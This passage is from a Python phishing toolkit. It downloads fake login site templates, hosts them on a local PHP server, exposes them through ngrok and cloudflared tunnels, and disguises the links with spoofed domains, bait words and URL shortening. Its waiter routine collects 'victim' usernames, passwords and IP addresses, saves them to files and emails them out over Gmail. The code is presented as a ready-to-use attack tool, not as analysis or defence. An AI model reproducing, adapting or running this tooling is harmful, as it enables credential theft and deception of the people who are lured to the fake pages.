            print(f"{error}Device not supported!")
            exit(1)
        if isfile(f"{root}/.ngrokfolder/ngrok"):
            if sudo:
                system("sudo chmod +x $HOME/.ngrokfolder/ngrok")
            else:
                system("chmod +x $HOME/.ngrokfolder/ngrok")
    if not isfile(f"{root}/.cffolder/cloudflared") or (brew and not cloudflared):
        sprint(f"\n{info}Downloading cloudflared.....{nc}")
        internet()
        system("rm -rf cloudflared cloudflared.tgz")
        if platform.find("Linux")!=-1:
            if architecture.find("aarch64")!=-1:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{root}/.cffolder/cloudflared")
            elif architecture.find("arm")!=-1:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{root}/.cffolder/cloudflared")
            elif architecture.find("x86_64")!=-1:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{root}/.cffolder/cloudflared")
            else:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{root}/.cffolder/cloudflared")
        elif platform.find("Darwin")!=-1:
            if architecture.find("x86_64")!=-1:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                extract("cloudflared.tgz", f"{root}/.cffolder")
            else:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
                system("brew install cloudflare/cloudflare/cloudflared")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        if isfile(f"{root}/.cffolder/cloudflared"):
            if sudo:
                system("sudo chmod +x $HOME/.cffolder/cloudflared")
            else:
                system("chmod +x $HOME/.cffolder/cloudflared")
    for process in processes:
        if system(f"pidof {process} > /dev/null 2>&1")==0:
            sprint(f"{error}Previous {process} still running! Please restart terminal and try again{nc}")
            pexit()
    system("rm -rf $HOME/.site && mkdir $HOME/.site")
    ngrok_token()
    if not isfile(email_file):
        return
    with open(email_file) as email_data:
        email_config = email_data.read()
        if is_json(email_config):
            data = loads(email_config)
            email = data["email"]
            password = data["password"]
            receiver = data["receiver"]
            # As the server is of gmail, we only allow gmail login
            if email.find("@gmail.com")!=-1:
                is_mail_ok = True
            else:
                print(f"\n{error}Only gmail with app password is allowed")
                sleep(1)


# 3rd function checking requirements and download files 
def requirements(folder):
    if isfile(f"{root}/.websites/version.txt"):
        with open(f"{root}/.websites/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if zipver!=version:
                sprint(f"\n{info}Downloading required files.....\n{nc}")
                download(websites_url, "websites.zip")
    else:
        sprint(f"\n{info}Downloading required files.....\n{nc}")
        download(websites_url, "websites.zip")
    if isfile("websites.zip"):
        system("rm -rf $HOME/.websites/*")
        extract("websites.zip", f"{root}/.websites")
        remove("websites.zip")
    if exists(f"{root}/.websites/{folder}"):
        system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
    else:
        internet()
        sprint(f"\n{info}Downloading required files.....\n{nc}")
        system("rm -rf site.zip")
        download(f"https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip", "site.zip")
        if not exists(f"{root}/.websites/{folder}"):
            mkdir(f"{root}/.websites/{folder}")
        extract("site.zip", f"{root}/.websites/{folder}")
        remove("site.zip")
        system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
    server()

# Start server and tunneling
def server():
    system("clear")
    sprint(logo, 0.01)
    # Termux requires hotspot in some android
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(1)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    internet()
    system(f"cd $HOME/.site && php -S {local_url} > /dev/null 2>&1 &")
    sleep(2)
    try:
        status_code = get(f"http://{local_url}").status_code
    except Exception as e:
        write_error(e)
        status_code = 400
    if status_code <= 400:
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error! Code: {status_code}")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    system("rm -rf $HOME/.cffolder/log.txt")
    if system("command -v termux-chroot > /dev/null 2>&1")==0:
        system(f"cd $HOME/.ngrokfolder && termux-chroot ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    # Use installed ngrok and cloudflared in mac
    elif brew and ngrok and cloudflared:
        system(f"ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    else:
        system(f"cd $HOME/.ngrokfolder && ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    sleep(9)
    try:
        ngrok_api = get("http://127.0.0.1:4040/api/tunnels").json()
        ngrok_url = ngrok_api["tunnels"][0]["public_url"]
    except Exception as e:
        write_error(e)
        ngrok_url = ""
    if ngrok_url.find("ngrok")!=-1:
        ngrok_success=True
    else:
        ngrok_success=False
    if isfile(f"{root}/.cffolder/log.txt"):
        cf_url=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read().strip()
    else:
        cf_url=""
        sprint(f"\n{error}Cloudflared failed to start!{nc}")
    if cf_url.find("cloudflare")!=-1:
        cf_success=True
    else:
        cf_success=False
    if ngrok_success and cf_success:
        url_manager(cf_url, "1", "2")
        url_manager(ngrok_url, "3", "4")
        if tunneler.lower() == "ngrok":
            cuask(ngrok_url)
        else:
            cuask(cf_url)
    elif cf_success and not ngrok_success:
        url_manager(cf_url, "1", "2")
        cuask(cf_url)
    elif ngrok_success and not cf_success:
        url_manager(ngrok_url, "1", "2")
        cuask(ngrok_url)
    elif not (cf_success and ngrok_success):
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        waiter()
    else:
        sprint(f"\n{error}Unknown error!")
        pexit()


# Output urls
def url_manager(url, num1, num2):
    global mask
    if num1=="1":
        sprint(f"\n{success}Your urls are given below:")
    print(f"\n{info2}URL {num1} > {yellow}{url}")
    print(f"{info2}URL {num2} > {yellow}{mask}@{url.replace('https://','')}")


# Ask to mask url and shadow url
def cuask(url):
    metaurl = input(f"\n{ask}{bcyan}Enter shadow url(for social media preview)[press enter to skip] : {green}")
    write_meta(metaurl)
    cust = input(f"\n{ask}{bcyan}Wanna try custom link?(y or press enter to skip) > ")
    if not cust=="":
        masking(url)
    waiter()

# Optional function for ngrok url masking
def masking(url):
    website = "https://is.gd/create.php?format=simple&url="+url.strip()
    internet()
    try:
        res = get(website).text
    except Exception as e:
        write_error(e)
        res = ""
    resp = popen(f"echo '{res}' | head -n1").read().strip()
    if not resp.find("https://")!=-1:
        sprint(f"{error}Service not available!\n{resp}")
        waiter()
    short = resp.replace("https://", "")
    # Remove slash and spaces from inputs
    domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain == "":
        sprint(f"\n{error}No domain!")
    else:
        domain = sub("(/| )", ".", sub("https?://", "", domain))
        domain= "https://"+domain+"-"
    bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("(/| )", "-", bait)+"@"
    final = domain+bait+short
    sprint(f"\n{success}Your custom url is > {bgreen}{final}")
    waiter()

# Last function capturing credentials
def waiter():
    global is_mail_ok
    system("rm -rf $HOME/.site/ip.txt")
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(f"{root}/.site/usernames.txt"):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                show_file_data(f"{root}/.site/usernames.txt")
                with open(f"{root}/.site/usernames.txt","r") as ufile:
                    userdata = ufile.read()
                    if is_mail_ok:
                        send_mail(userdata)
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                print(f"\n{info}Saved in usernames.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                # Just add the IP
                system(f"cat $HOME/.site/usernames.txt >> {saved_file}")
                remove(f"{root}/.site/usernames.txt")
            sleep(0.75)
            if isfile(f"{root}/.site/ip.txt"):
                print(logo)
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                show_file_data(f"{root}/.site/ip.txt")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                system(f"cat $HOME/.site/ip.txt | head -n1 >> {saved_file}")
                print(f"\n{info}Saved in ip.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(f"{root}/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        system("stty -echoctl") # Skip printing ^C
        if update:
            updater()
        main()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!
